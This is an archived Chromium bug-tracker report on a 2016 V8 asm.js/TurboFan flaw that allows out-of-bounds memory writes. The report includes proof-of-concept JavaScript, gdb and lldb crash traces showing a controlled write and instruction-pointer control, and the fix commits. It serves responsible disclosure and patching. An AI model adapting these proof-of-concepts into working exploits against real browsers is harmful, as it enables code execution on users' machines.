# Security: [v8] Out of bound(??) memory write with asm.js

| Field | Value |
|-------|-------|
| **Issue ID** | [40083757](https://issues.chromium.org/issues/40083757) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | cw...@gmail.com |
| **Assignee** | ti...@chromium.org |
| **Created** | 2016-02-25 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

A vulnerable javascript code can write any value to outside of an array buffer.

**VERSION**  

v8 4.8.271.20 (which is used by chrome now)

## **REPRODUCTION CASE** -------- javascript code --------------------- boom=(function(stdlib,foreign,heap){ "use asm"; var Uint8ArrayView=new stdlib.Uint8Array(heap); var Int32ArrayView=new stdlib.Int32Array(heap); function f(i,i1){ i1=Uint8ArrayView[256]; // This following value '10' determines the value of 'rax' Int32ArrayView[i1>>10] = 0xabcdefaa; return(-i1+((Int32ArrayView[((i1))>>2])))} return f })(this,0, new ArrayBuffer(256)); for (var i = 0; i < 400; ++i) { boom(0, 0x1000); }

Run this code with d8 in Ubuntu 14.04 64bit, then d8 crashes.

$ gdb -q --args ../../../v8\_norm/out/x64.release/d8 ./crash.js  

Reading symbols from ../../../v8\_norm/out/x64.release/d8...(no debugging symbols found)...done.  

(gdb) r  

Starting program: /home/tunz/working/v8/v8\_norm/out/x64.release/d8 ./crash.js  

[Thread debugging using libthread\_db enabled]  

Using host libthread\_db library "/lib/x86\_64-linux-gnu/libthread\_db.so.1".  

[New Thread 0x7ffff6bca700 (LWP 17370)]  

[New Thread 0x7ffff63c9700 (LWP 17371)]  

[New Thread 0x7ffff5bc8700 (LWP 17372)]  

[New Thread 0x7ffff53c7700 (LWP 17373)]

Program received signal SIGSEGV, Segmentation fault.  

0x0000397584b3f85d in ?? ()  

(gdb) bt  

#0 0x0000397584b3f85d in ?? ()  

#1 0x000008a0fa0198f1 in ?? ()  

#2 0x000008a0fa0198b1 in ?? ()  

#3 0x00007fffffffe190 in ?? ()  

#4 0x0000397584b3d412 in ?? ()  

#5 0x0000100000000000 in ?? ()  

#6 0x0000000000000000 in ?? ()  

(gdb) x/i $pc  

=> 0x397584b3f85d: mov DWORD PTR [rbx+rax\*1],0xabcdefaa  

(gdb) i r rax  

rax 0xff800000 4286578688  

(gdb) i r rbx  

rbx 0x16fb0d0 24096976  

(gdb)

The program tried to write a given value (0xabcdefaa) to an out of buffer.

The 'rax' is value is calculated by this formula (uint32\_t)(0x100000000 - (0x200000000 >> x)), 'x' is mentioned in the javascript code. Thus, this vulnerability can write down any value, but target address is limited.

# Address sanitizer catches another error: ASAN:SIGSEGV

==19761==ERROR: AddressSanitizer: SEGV on unknown address 0x61508000da00 (pc 0x7fffcc33fea8 bp 0x7fffffffbc98 sp 0x7fffffffbc80 T0)  

#0 0x7fffcc33fea7 (<unknown module>)

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: SEGV ??:0 ??  

==19761==ABORTING

## Attachments

- [crash.html](attachments/crash.html) (text/plain, 2.2 KB)

## Timeline

### cw...@gmail.com (2016-02-25)

Oh, the array index can be any value within 32bit integer using another operations after shifting.

With this script:
------------------------------------------------
boom=(function(stdlib,foreign,heap){
    "use asm";
    var Uint8ArrayView=new stdlib.Uint8Array(heap);
    var Int32ArrayView=new stdlib.Int32Array(heap);
    function f(i,i1){
        i1=Uint8ArrayView[256];
        Int32ArrayView[(i1>>3) % 0x9fafafb0] = 0xabcdefaa; // Modular operating after shifting
        return(-i1+((Int32ArrayView[i1>>2])))}
return f
})(this,0, new ArrayBuffer(256));
  for (var i = 0; i < 400; ++i) {
    boom(0, 0x1000);
  }
---------------------------------------

$ gdb -q --args ../../../v8_norm/out/x64.release/d8 ./crash.js
Reading symbols from ../../../v8_norm/out/x64.release/d8...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/tunz/working/v8/v8_norm/out/x64.release/d8 ./crash.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff6bca700 (LWP 5149)]
[New Thread 0x7ffff63c9700 (LWP 5150)]
[New Thread 0x7ffff5bc8700 (LWP 5151)]
[New Thread 0x7ffff53c7700 (LWP 5152)]

Program received signal SIGSEGV, Segmentation fault.
0x000039e0ab53fa58 in ?? ()
(gdb) x/i $pc
=> 0x39e0ab53fa58:	mov    DWORD PTR [rax+0x41414140],0xabcdefaa
----------------------------------------------------------------------
The base address is now 0x41414140 (It's not 0x41414141 because of 4byte alignment)

### cl...@chromium.org (2016-02-25)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5682101975777280

Uploader: ochang@google.com
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN
Crash Address: 0x6190414222c0
Crash State:
  v8::internal::Invoke
  v8::internal::Execution::Call
  v8::Script::Run
  

Minimized Testcase (0.41 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv955jySb04-OsQW-6hAc6NpGeZXJFusCj2F9dW2R_HZFpi6lOrsXYeXui3q-nMMDJ_V-7NcYGpN7tjJFRx7wAbxUUjiHMJLN2KK2y9XXYySheQyxWjPIjkipiLxOmK1c9FPmU6OwseO92KiwVbxGz4nwvxQ5Rg
boom=(function(stdlib,foreign,heap){
    "use asm";
    var Uint8ArrayView=new stdlib.Uint8Array();
    var Int32ArrayView=new stdlib.Int32Array(heap);
    function f(i1){
        i1=Uint8ArrayView[256];
        Int32ArrayView[(i1>>3) % 0x9fafafb0] = 0xabcdefaa; // Modular operating after shifting
        return(-i1+((Int32ArrayView[i1>>2])))}
return f
})(this,0,256);
  for (var i = 0; i < 400; ++i) {
    boom();
  }


Filer: ochang

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### oc...@chromium.org (2016-02-25)

Thanks for the report! I've reproed this on the current stable Chrome.

+v8 folks. Could you please look into this, or find a more suitable owner?

[Monorail components: Blink>JavaScript]

### ti...@chromium.org (2016-02-25)

[Empty comment from Monorail migration]

### ti...@chromium.org (2016-02-25)

This is a bug in the address calculation optimizations in TurboFan. I'll take a closer look.

### bm...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

### bm...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-02-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/58ab990aa8c3aeee38e888c1c33404f4b5a14759

commit 58ab990aa8c3aeee38e888c1c33404f4b5a14759
Author: bmeurer <bmeurer@chromium.org>
Date: Fri Feb 26 11:05:22 2016

[turbofan] Bailout if LoadBuffer typing assumption doesn't hold.

The LoadBuffer operator that is used for asm.js heap access claims to
return only the appropriate typed array type, but out of bounds access
could make it return undefined. So far we tried to "repair" the graph
later if we see that our assumption was wrong, and for various reasons
that worked for some time. But now that wrong type information that is
propagated earlier is picked up appropriately and thus we generate wrong
code, i.e. we in the repro case we feed NaN into ChangeFloat64Uint32 and
thus get 2147483648 instead of 0 (with proper JS truncation).

This was always considered a temporary hack until we have a proper
asm.js pipeline, but since we still run asm.js through the generic
JavaScript pipeline, we have to address this now. Quickfix is to just
bailout from the pipeline when we see that the LoadBuffer type was
wrong, i.e. the result of LoadBuffer is not properly truncated and thus
undefined or NaN would be observable.

R=mstarzinger@chromium.org, jarin@chromium.org
BUG=chromium:589792
LOG=y

Review URL: https://codereview.chromium.org/1740123002

Cr-Commit-Position: refs/heads/master@{#34322}

[modify] https://crrev.com/58ab990aa8c3aeee38e888c1c33404f4b5a14759/src/compiler/pipeline.cc
[modify] https://crrev.com/58ab990aa8c3aeee38e888c1c33404f4b5a14759/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/58ab990aa8c3aeee38e888c1c33404f4b5a14759/src/compiler/simplified-lowering.h
[modify] https://crrev.com/58ab990aa8c3aeee38e888c1c33404f4b5a14759/test/cctest/cctest.gyp
[delete] https://crrev.com/cb29f9cdbceace4e8ea3a9701e421acea3ff9c6d/test/cctest/compiler/test-run-properties.cc
[add] https://crrev.com/58ab990aa8c3aeee38e888c1c33404f4b5a14759/test/mjsunit/regress/regress-crbug-589792.js


### bm...@chromium.org (2016-02-26)

It wasn't the address calculation, but rather one of the hacks we introduced for asm.js in the JavaScript pipeline. Quickfix landed.

### cw...@gmail.com (2016-02-26)

FYI, this vulnerability can (not reliable but) easily control eip of Mac OS X Chrome.
(Chrome version 48.0.2564.116 stable 64bit, Max OS X 10.11.3 15D21)

-----------------------------------------------------------------------------------
Executable module set to "/Applications/Google Chrome.app/Contents/Versions/48.0.2564.116/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper".
Architecture set to: x86_64h-apple-macosx.
(lldb) c
Process 39203 resuming
Process 39203 stopped
* thread #1: tid = 0x8a906, 0x0000414141414141, name = 'CrRendererMain', queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x414141414141)
    frame #0: 0x0000414141414141
error: memory read failed for 0x414141414000
-------------------------------------------------------

I'll attach the PoC file.

### cl...@chromium.org (2016-02-26)

ClusterFuzz has detected this issue as fixed in range 34321:34322.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5682101975777280

Uploader: ochang@google.com
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN
Crash Address: 0x6190414222c0
Crash State:
  v8::internal::Invoke
  v8::internal::Execution::Call
  v8::Script::Run
  
Fixed: V8: r34321:34322

Minimized Testcase (0.41 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv955jySb04-OsQW-6hAc6NpGeZXJFusCj2F9dW2R_HZFpi6lOrsXYeXui3q-nMMDJ_V-7NcYGpN7tjJFRx7wAbxUUjiHMJLN2KK2y9XXYySheQyxWjPIjkipiLxOmK1c9FPmU6OwseO92KiwVbxGz4nwvxQ5Rg
boom=(function(stdlib,foreign,heap){
    "use asm";
    var Uint8ArrayView=new stdlib.Uint8Array();
    var Int32ArrayView=new stdlib.Int32Array(heap);
    function f(i1){
        i1=Uint8ArrayView[256];
        Int32ArrayView[(i1>>3) % 0x9fafafb0] = 0xabcdefaa; // Modular operating after shifting
        return(-i1+((Int32ArrayView[i1>>2])))}
return f
})(this,0,256);
  for (var i = 0; i < 400; ++i) {
    boom();
  }


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2016-02-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-11)

titzer@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ti...@chromium.org (2016-03-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-14)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ha...@chromium.org (2016-03-18)

Please merge to 4.9 and 5.0

### ti...@google.com (2016-03-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-03-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/8ce3902dd122cdda60b214a84b0ee612baa3be8f

commit 8ce3902dd122cdda60b214a84b0ee612baa3be8f
Author: Michael Hablich <hablich@chromium.org>
Date: Wed Mar 30 12:21:55 2016

Version 4.9.385.34 (cherry-pick)

Merged 58ab990aa8c3aeee38e888c1c33404f4b5a14759

[turbofan] Bailout if LoadBuffer typing assumption doesn't hold.

BUG=chromium:589792
LOG=N
R=bmeurer@chromium.org

Review URL: https://codereview.chromium.org/1839383002 .

Cr-Commit-Position: refs/branch-heads/4.9@{#40}
Cr-Branched-From: 2fea296569597e5064f81fd8fce58f1848de261a-refs/heads/4.9.385@{#1}
Cr-Branched-From: 0c1430ac2b65847559d6a09f883ee7e5a91063c9-refs/heads/master@{#33306}

[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/include/v8-version.h
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/pipeline.cc
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/simplified-lowering.h
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/test/cctest/cctest.gyp
[delete] https://crrev.com/1c998eae01e53610a852e6b2d9b7d2822eefe8f3/test/cctest/compiler/test-run-properties.cc
[add] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/test/mjsunit/regress/regress-crbug-589792.js


### bu...@chromium.org (2016-03-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/8ce3902dd122cdda60b214a84b0ee612baa3be8f

commit 8ce3902dd122cdda60b214a84b0ee612baa3be8f
Author: Michael Hablich <hablich@chromium.org>
Date: Wed Mar 30 12:21:55 2016

Version 4.9.385.34 (cherry-pick)

Merged 58ab990aa8c3aeee38e888c1c33404f4b5a14759

[turbofan] Bailout if LoadBuffer typing assumption doesn't hold.

BUG=chromium:589792
LOG=N
R=bmeurer@chromium.org

Review URL: https://codereview.chromium.org/1839383002 .

Cr-Commit-Position: refs/branch-heads/4.9@{#40}
Cr-Branched-From: 2fea296569597e5064f81fd8fce58f1848de261a-refs/heads/4.9.385@{#1}
Cr-Branched-From: 0c1430ac2b65847559d6a09f883ee7e5a91063c9-refs/heads/master@{#33306}

[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/include/v8-version.h
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/pipeline.cc
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/src/compiler/simplified-lowering.h
[modify] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/test/cctest/cctest.gyp
[delete] https://crrev.com/1c998eae01e53610a852e6b2d9b7d2822eefe8f3/test/cctest/compiler/test-run-properties.cc
[add] https://crrev.com/8ce3902dd122cdda60b214a84b0ee612baa3be8f/test/mjsunit/regress/regress-crbug-589792.js


### bu...@chromium.org (2016-03-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/bb7e160edde16cb31e9f0626d17d91e0d13bf99b

commit bb7e160edde16cb31e9f0626d17d91e0d13bf99b
Author: Michael Hablich <hablich@chromium.org>
Date: Wed Mar 30 12:27:45 2016

Version 5.0.71.26 (cherry-pick)

Merged 58ab990aa8c3aeee38e888c1c33404f4b5a14759

[turbofan] Bailout if LoadBuffer typing assumption doesn't hold.

BUG=chromium:589792
LOG=N
R=bmeurer@chromium.org

Review URL: https://codereview.chromium.org/1848453002 .

Cr-Commit-Position: refs/branch-heads/5.0@{#33}
Cr-Branched-From: ad16e6c2cbd2c6b0f2e8ff944ac245561c682ac2-refs/heads/5.0.71@{#1}
Cr-Branched-From: bd9df50d75125ee2ad37b3d92c8f50f0a8b5f030-refs/heads/master@{#34215}

[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/include/v8-version.h
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/pipeline.cc
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/simplified-lowering.h
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/test/cctest/cctest.gyp
[delete] https://crrev.com/a48016023552db4c0db7f41db518967b5cba5e0f/test/cctest/compiler/test-run-properties.cc
[add] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/test/mjsunit/regress/regress-crbug-589792.js


### bu...@chromium.org (2016-03-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/bb7e160edde16cb31e9f0626d17d91e0d13bf99b

commit bb7e160edde16cb31e9f0626d17d91e0d13bf99b
Author: Michael Hablich <hablich@chromium.org>
Date: Wed Mar 30 12:27:45 2016

Version 5.0.71.26 (cherry-pick)

Merged 58ab990aa8c3aeee38e888c1c33404f4b5a14759

[turbofan] Bailout if LoadBuffer typing assumption doesn't hold.

BUG=chromium:589792
LOG=N
R=bmeurer@chromium.org

Review URL: https://codereview.chromium.org/1848453002 .

Cr-Commit-Position: refs/branch-heads/5.0@{#33}
Cr-Branched-From: ad16e6c2cbd2c6b0f2e8ff944ac245561c682ac2-refs/heads/5.0.71@{#1}
Cr-Branched-From: bd9df50d75125ee2ad37b3d92c8f50f0a8b5f030-refs/heads/master@{#34215}

[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/include/v8-version.h
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/pipeline.cc
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/src/compiler/simplified-lowering.h
[modify] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/test/cctest/cctest.gyp
[delete] https://crrev.com/a48016023552db4c0db7f41db518967b5cba5e0f/test/cctest/compiler/test-run-properties.cc
[add] https://crrev.com/bb7e160edde16cb31e9f0626d17d91e0d13bf99b/test/mjsunit/regress/regress-crbug-589792.js


### ha...@chromium.org (2016-04-11)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-04-12)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-04-12)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-04-12)

Thanks for the report. How would you like to be credited when we mention this in Chrome's release notes?

### cw...@gmail.com (2016-04-12)

I want to use my name: Choongwoo Han.

### mb...@chromium.org (2016-04-13)

Thanks again for the report! This one qualified for a $5000 reward.

### bu...@chromium.org (2016-04-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/f5961f90b12d457cd5ce327a0a387396e74ee22f

commit f5961f90b12d457cd5ce327a0a387396e74ee22f
Author: jarin <jarin@chromium.org>
Date: Thu Apr 14 13:13:25 2016

[turbofan] Change number operations to handle Undefined as well.

This allows us to remove the turbofan bailout that we introduced
as a response to crbug.com/589792.

BUG=chromium:589792
LOG=n

Review URL: https://codereview.chromium.org/1884713003

Cr-Commit-Position: refs/heads/master@{#35493}

[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/change-lowering.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/graph-visualizer.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/js-typed-lowering.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/representation-change.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/representation-change.h
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/typer.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/src/compiler/verifier.cc
[modify] https://crrev.com/f5961f90b12d457cd5ce327a0a387396e74ee22f/test/unittests/compiler/change-lowering-unittest.cc


### ti...@google.com (2016-04-22)

Someone from our finance team should reach out to you within 7 days. If that doesn't happen, please reach out to me via email at timwillis@ or update this bug.

Thanks again for your report!

### ti...@google.com (2016-05-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### hu...@gmail.com (2017-08-10)

[Comment Deleted]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/589792?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083757)*
